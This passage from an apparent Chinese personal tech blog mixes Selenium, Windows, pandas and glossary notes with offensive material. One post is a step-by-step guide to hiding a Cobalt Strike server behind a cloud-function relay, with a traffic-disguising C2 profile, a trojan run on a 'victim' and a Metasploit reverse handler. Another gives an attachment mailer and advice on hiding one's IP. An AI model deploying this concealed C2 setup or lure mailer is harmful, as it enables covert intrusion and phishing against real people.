<td>send_keys(Keys.ENTER)</td>
<td>回车键</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘a’)</td>
<td>全选（ctrl +a）</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘c’)</td>
<td>复制</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘x’)</td>
<td>剪切</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘v’)</td>
<td>粘贴</td>
</tr>
<tr>
<td>send_keys(Keys.F1)</td>
<td>键盘F1</td>
</tr>
</tbody></table>
<h2 id="4-5、Frame窗口切换"><a href="#4-5、Frame窗口切换" class="headerlink" title="4.5、Frame窗口切换"></a><strong>4.5、Frame窗口切换</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.switch_to.frame() 切换窗口</span><br><span class="line"></span><br><span class="line">driver.switch_to.frame(driver.find_element_by_id(&quot;iframe&quot;)) #切换到frame里边</span><br></pre></td></tr></table></figure>



<h2 id="4-6、根据元素定位坐标"><a href="#4-6、根据元素定位坐标" class="headerlink" title="4.6、根据元素定位坐标"></a><strong>4.6、根据元素定位坐标</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kw &#x3D; self.driver.find_element_by_id(&#39;kw&#39;) </span><br><span class="line">kw_x &#x3D; kw.location.get(&#39;x&#39;)#百度搜索框的x坐标 </span><br><span class="line">kw_y &#x3D; kw.location.get(&#39;y&#39;)#百度搜索框的y坐标</span><br></pre></td></tr></table></figure>



<h2 id="4-7、根据坐标进行点击"><a href="#4-7、根据坐标进行点击" class="headerlink" title="4.7、根据坐标进行点击"></a><strong>4.7、根据坐标进行点击</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver from selenium.webdriver.common.action_chains import ActionChains ActionChains(dr).move_by_offset(500, 100).click().perform()</span><br></pre></td></tr></table></figure>



<h2 id="4-8、弹窗处理"><a href="#4-8、弹窗处理" class="headerlink" title="4.8、弹窗处理"></a><strong>4.8、弹窗处理</strong></h2><p>当页面出现了弹窗提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert &#x3D; driver.switch_to_alert()</span><br></pre></td></tr></table></figure>



<h2 id="4-9、展开shadow-root"><a href="#4-9、展开shadow-root" class="headerlink" title="4.9、展开shadow-root"></a><strong>4.9、展开shadow-root</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#但是在最新版本的chrome 无法使用</span><br><span class="line">def show_shadow(element):</span><br><span class="line">    # 展开shadow</span><br><span class="line">    shadow_root &#x3D; browser.execute_script(&#39;return arguments[0].shadowRoot&#39;, element)</span><br><span class="line">    return shadow_root</span><br><span class="line">domain_view &#x3D; browser.find_element_by_tag_name(&#39;ip-address-view&#39;)  # 找到name&#x3D;domain-view的元素</span><br><span class="line">shadow &#x3D; show_shadow(domain_view)  # 展开shadowRoot</span><br><span class="line">report &#x3D; shadow.find_element_by_id(&#39;report&#39;)  # 找到id为report的元素</span><br></pre></td></tr></table></figure>



<h2 id="4-10、页面切换"><a href="#4-10、页面切换" class="headerlink" title="4.10、页面切换"></a><strong>4.10、页面切换</strong></h2><p>一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.switch_to.window(&quot;this is window name&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="4-11、execute-script"><a href="#4-11、execute-script" class="headerlink" title="4.11、execute_script"></a><strong>4.11、execute_script</strong></h2><p>有些在页面上无法定位的元素，需要执行js操作的时候，就需要用此方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute_script(script, *args)</span><br><span class="line"></span><br><span class="line">js&#x3D;&quot;window.scrollTo(0,document.body.scrollHeight)&quot; #scrollTo滚动条 driver.execute_script(js)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>win10家庭版没有组策略解决方式</title>
    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>CTRL+C保存</p>
<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
      <tags>
        <tag>window</tag>
      </tags>
  </entry>
  <entry>
    <title>云函数和cs并派生到msf</title>
    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
<p>云函数内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>



<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
<p>修改后发布即可</p>
<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
<p><strong>可以使用80和443两个端口</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>

<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>

<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
<p>失败emmmm</p>
]]></content>
      <categories>
        <category>安全</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>邮件</title>
    <url>/%E9%82%AE%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="邮件相关【杂】"><a href="#邮件相关【杂】" class="headerlink" title="邮件相关【杂】"></a>邮件相关【杂】</h1><h2 id="一、内网邮件服务器"><a href="#一、内网邮件服务器" class="headerlink" title="一、内网邮件服务器"></a>一、内网邮件服务器</h2><p>​    第三方软件HMailServer，可以很容易搭建内网邮件服务器 —适用于windows  亲测有效。留存。【很详细】</p>
<p><a href="https://www.cnblogs.com/tiger-fu/p/7448005.html">https://www.cnblogs.com/tiger-fu/p/7448005.html</a></p>
<p><a href="https://blog.csdn.net/gelupu/article/details/38325029">https://blog.csdn.net/gelupu/article/details/38325029</a></p>
<h2 id="二、邮件"><a href="#二、邮件" class="headerlink" title="二、邮件"></a>二、邮件</h2><p>​    建议可以使用云函数发送，可以避免自身的真实IP泄露</p>
<p>pyhon 发送邮箱【带附件】</p>
<p>#注意模块的安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">#输入发件人邮箱名称</span><br><span class="line">email_name &#x3D; &#39;邮箱【建议写自定义邮箱】&#39;</span><br><span class="line"># 输入用户授权码</span><br><span class="line">passwd &#x3D; &#39;授权码 QQ邮箱-账户&#39;</span><br><span class="line"># 收件人邮箱</span><br><span class="line">msg_to &#x3D; &#39;收件人邮箱&#39;</span><br><span class="line"># 邮件的正文</span><br><span class="line">content &#x3D; &quot;测试&quot;</span><br><span class="line"># 设置邮件</span><br><span class="line">msg &#x3D; MIMEText(content)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;utf-8&quot;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: base64 5rWL6K+V</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">msg[&#39;subject&#39;]&#x3D;&#39;嗷~&#39;</span><br><span class="line">#设置发件人</span><br><span class="line">msg[&#39;From&#39;]&#x3D; &#39;你隔壁的小王&#39;</span><br><span class="line"># 这个参数设置要发给谁</span><br><span class="line">msg[&#39;To&#39;] &#x3D; msg_to</span><br><span class="line">#添加附件内容</span><br><span class="line">msg.attach(content_part)</span><br><span class="line"></span><br><span class="line">#*********************构造附件***********</span><br><span class="line"># 文本类型的附件</span><br><span class="line">att1 &#x3D; MIMEText(open(&quot;.&#x2F;baidu.doc&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att1[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att1.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;学习最新信息.txt&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att1)</span><br><span class="line"></span><br><span class="line"># 图片附件</span><br><span class="line">att2 &#x3D; MIMEText(open(&quot;.&#x2F;4.png&quot;,&#39;rb&#39;).read(),&#39;plain&#39;,&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"># 添加头信息，我告诉服务器，我现在是一个附件</span><br><span class="line">att2[&#39;Content-Type&#39;]&#x3D;&#39;application&#x2F;octet-stream&#39;</span><br><span class="line">att2.add_header(&quot;Content-Disposition&quot;,&#39;attachment&#39;,filename&#x3D;(&#39;gbk&#39;,&quot;&quot;,&#39;小猪猪.png&#39;))</span><br><span class="line"># 把内容添加到邮件中</span><br><span class="line">msg.attach(att2)</span><br><span class="line">#连接服务器</span><br><span class="line">s&#x3D; smtplib.SMTP_SSL(&#39;smtp.qq.com&#39;,465)</span><br><span class="line"># 登陆我的邮箱</span><br><span class="line">s.login(email_name,passwd)</span><br><span class="line"># 发送邮箱</span><br><span class="line">s.sendmail(email_name,msg_to,msg.as_string())</span><br><span class="line">print(&quot;发送成功&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>邮件</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全专业术语</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
    <content><![CDATA[<div class="note default simple"><h1 id="1-CMS"><a href="#1-CMS" class="headerlink" title="1.CMS"></a>1.CMS</h1></div>

<p>ContentManagementSystem的缩写，意为”内容管理系统”。</p>
<p>CMS是一种位于WEB前端和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容管理系统是一个很泛的概念：从商业门户网站的新闻系统到个人的Weblog都可以称作发布系统。</p>
<div class="note default simple"><h1 id="2-WAF"><a href="#2-WAF" class="headerlink" title="2.WAF"></a>2.WAF</h1></div>

<p>Web应用防护系统（也称：网站应用级<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=135662&ss_c=ssc.citiao.link">入侵防御系统</a>。英文：WebApplicationFirewall，简称：WAF）</p>
<p>WAF是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品，主要用于防御针对网络应用层的攻击，像SQL注入、跨站脚本攻击、参数篡改、应用平台漏洞攻击、拒绝服务攻击等。它可以在HTTP流量到达服务器前检测可疑访问。同时，也能防止web应用回去某些未授权的数据。</p>
<p>常见的有：安全狗，D盾，宝塔、玄武盾 </p>
<div class="note default simple"><h1 id="3-CDN"><a href="#3-CDN" class="headerlink" title="3.CDN"></a>3.CDN</h1></div>

<p>内容分发网络，英文：Content Delivery Network</p>
<p>CDN是构建在网络之上的内容分发网络。CDN的基本原理是广泛采用各种<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8230101&ss_c=ssc.citiao.link">缓存服务器</a>，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</p>
<h1 id="旁注与C段嗅探的意义"><a href="#旁注与C段嗅探的意义" class="headerlink" title="旁注与C段嗅探的意义"></a>旁注与C段嗅探的意义</h1><div class="note default simple"><h1 id="4-旁注"><a href="#4-旁注" class="headerlink" title="4.旁注"></a>4.旁注</h1></div>

<p>从同台服务器上的其他网站上得到漏洞。利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。</p>
<div class="note default simple"><h1 id="5-C段嗅探"><a href="#5-C段嗅探" class="headerlink" title="5.C段嗅探"></a>5.C段嗅探</h1></div>

<p>每个IP有ABCD四个段，</p>
<p>如：192.168.0.1，A段就是192，B段是168，C段是0，D段是1。</p>
<p>C段嗅探的意思就是拿下它同C段中的其中一台服务器。</p>
<p>在渗透中，当无法在网站找到漏洞或无法成功渗透的情况下，这时可采用旁注或C段思路进行渗透。</p>
<div class="note default simple"><h1 id="6-IDS"><a href="#6-IDS" class="headerlink" title="6.IDS"></a>6.IDS</h1></div>

<p>侵检测系统，英文：Intrusion Detection Systems。</p>
<p>IDS是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。</p>
<div class="note default simple"><h1 id="7-IPS"><a href="#7-IPS" class="headerlink" title="7.IPS"></a>7.IPS</h1></div>

<p>入侵防御系统，英文：Intrusion Prevention System</p>
<p>IPS系统是电脑网络安全设施，是对防病毒软件和防火墙的补充。 IPS系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p>
<div class="note default simple"><h1 id="8-横幅（banner）"><a href="#8-横幅（banner）" class="headerlink" title="8.横幅（banner）"></a>8.横幅（banner）</h1></div>

<p>一般是指一种特殊类型的在线广告资源或广告图片，通常显示在网页的顶部或侧面。它是一种HTML构造，用于显示给定的广告，并在单击时将用户带到广告商的站点。</p>
<div class="note default simple"><h1 id="9-POC"><a href="#9-POC" class="headerlink" title="9.POC"></a>9.POC</h1></div>

<p>全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码</p>
<div class="note default simple"><h1 id="10-EXP"><a href="#10-EXP" class="headerlink" title="10.EXP"></a>10.EXP</h1></div>

<p>全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<div class="note default simple"><p>PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，PoC 通常是无害的，Exp 通常是有害的</p>
<h1 id="11-PAYLOAD"><a href="#11-PAYLOAD" class="headerlink" title="11.PAYLOAD"></a>11.PAYLOAD</h1></div>

<p>中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
]]></content>
      <categories>
        <category>web相关</category>
      </categories>
  </entry>
  <entry>
    <title>pandas学习_01</title>
    <url>/pandas%E5%AD%A6%E4%B9%A0-01/</url>
    <content><![CDATA[<h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h2><p>sep=’\t’ </p>
<p>csv文件默认的是以逗号为分隔符，但是中文中逗号的使用率很高，爬取中文数据时就容易造成混淆，所以使用pandas写入csv时可以设置参数 sep=’\t’ ，即以tab为分隔符写入。</p>
<h1 id="一、读取和写入"><a href="#一、读取和写入" class="headerlink" title="一、读取和写入"></a><strong>一、读取和写入</strong></h1><h2 id="1、可读文件"><a href="#1、可读文件" class="headerlink" title="1、可读文件"></a><strong>1、可读文件</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-1649487061035.png" alt="img"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-16480176267801.png" alt="img"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-16480176267802.png" alt="img"></p>
<ul>
<li><em>filepath_or_buffer #需要读取的文件及路径</em></li>
<li><em>sep / delimiter 列分隔符，普通文本文件，应该都是使用结构化的方式来组织，才能使用dataframe</em></li>
<li><em>header 文件中是否需要读取列名的一行，header=None(使用names自定义列名,否则默认0,1,2,…)，header=0（将首行设为列名）</em></li>
<li><em>names 如果header=None，那么names必须制定！否则就没有列的定义了。</em></li>
<li><em>shkiprows= 10 # 跳过前十行</em> </li>
<li><em>nrows = 10 # 只去前10行</em> </li>
<li><em>usecols=[0,1,2,…] #需要读取的列，可以是列的位置编号，也可以是列的名称</em></li>
<li><em>parse_dates = [‘col_name’] # 指定某行读取为日期格式</em> </li>
<li><em>index_col = None /False /0，重新生成一列成为index值，0表示第一列，用作行索引的列编号或列名。可以是单个名称/数字或由多个名称/数字组成的列表（层次化索引）</em></li>
<li><em>error_bad_lines = False # 当某行数据有问题时，不报错，直接跳过，处理脏数据时使用</em> </li>
<li><em>na_values = ‘NULL’ # 将NULL识别为空值</em></li>
<li><em>encoding=’utf-8’ #指明读取文件的编码，默认utf-8</em></li>
</ul>
<p>读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">for inputfile in os.listdir(inputfile_dir):</span><br><span class="line">    pd.read_csv(inputfile, header&#x3D;None)　　　　　　　　　　　　　　　　 　　 #header&#x3D;None表示原始文件数据没有列索引，这样的话read_csv会自动加上列索引</span><br><span class="line">    pd.to_csv(outputfile, mode&#x3D;&#39;a&#39;, index&#x3D;False, header&#x3D;False)　　　　　　#header&#x3D;0表示不保留列名，index&#x3D;False表示不保留行索引，mode&#x3D;&#39;a&#39;表示附加方式写入，文件原有内容不会被清除</span><br></pre></td></tr></table></figure>



<p>(1)不指定sheet参数，默认读取第一个sheet，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df&#x3D;pd.read_excel(&quot;data_test.xlsx&quot;)</span><br></pre></td></tr></table></figure>


